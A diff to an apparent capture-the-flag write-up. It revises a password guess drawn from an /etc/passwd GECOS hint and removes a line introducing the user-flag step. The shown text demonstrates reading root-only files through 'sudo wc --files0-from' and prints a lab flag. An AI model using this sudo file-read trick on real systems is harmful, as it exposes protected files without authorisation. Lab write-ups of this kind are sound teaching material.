@@ -82,11 +82,11 @@ Checking `/etc/passwd` reveals a hint in the GECOS field:
 aaa:x:1001:1001:pa**wd -> root:/home/aaa:/bin/bash
 ```
 
-The description suggests the password is `password`:
+The description suggests the password is `root`:
 
 ```bash
 su aaa
-# password: password
+# password: root
 ```
 
 Success.
@@ -115,7 +115,6 @@ sudo wc --files0-from /root/root.txt
 wc: 'flag{root-7ed9295c3bdb1aaf2b427b64942b40fb}': No such file or directory
 ```
 
-The user flag is in `/home/bbb/user.txt` with permissions set to `000`, but the same trick works:
 
 ```bash
 sudo wc --files0-from /home/bbb/user.txt
